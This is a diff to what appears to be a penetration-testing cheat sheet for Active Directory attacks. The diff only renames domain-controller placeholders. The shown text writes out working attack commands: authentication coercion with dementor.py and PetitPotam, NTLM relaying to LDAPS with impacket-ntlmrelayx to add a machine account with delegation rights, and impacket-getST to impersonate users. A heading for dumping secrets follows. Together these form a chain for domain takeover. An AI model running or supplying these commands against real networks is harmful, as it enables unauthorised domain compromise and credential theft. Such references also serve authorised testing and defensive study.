@@ -19,7 +19,7 @@ impacket-rpcdump <dc> | grep -A 6 MS-RPRN
 https://github.com/NotMedic/NetNTLMtoSilverTicket
 
 ```
-dementor.py -d <domain> -u <user> -p <password> <attacker_ip> <dc2>
+dementor.py -d <domain> -u <user> -p <password> <attacker_ip> <dc>
 ```
 
 ## printerbug
@@ -47,13 +47,13 @@ PetitPotam.py -u <user> -p '<password>' -d <domain> <listener> <target>
 ## impacket-ntlmrelayx add computer
 #plateform/linux  #target/remote #cat/ATTACK/MITM 
 ```
-impacket-ntlmrelayx -t ldaps://<dc1> -smb2support --remove-mic --add-computer <computer_name> <computer_password> --delegate-access
+impacket-ntlmrelayx -t ldaps://<dc> -smb2support --remove-mic --add-computer <computer_name> <computer_password> --delegate-access
 ```
 
 ## use silver ticket
 #plateform/linux  #target/remote #cat/ATTACK/EXPLOIT 
 ```
-impacket-getST -spn host/<dc2> -impersonate <user_to_impersonate> -dc-ip <dc1_ip> '<domain>/<computer_name>$:<computer_password>'
+impacket-getST -spn host/<dc> -impersonate <user_to_impersonate> -dc-ip <dc_ip> '<domain>/<computer_name>$:<computer_password>'
 ```
 
 ## secret dump with kerberos
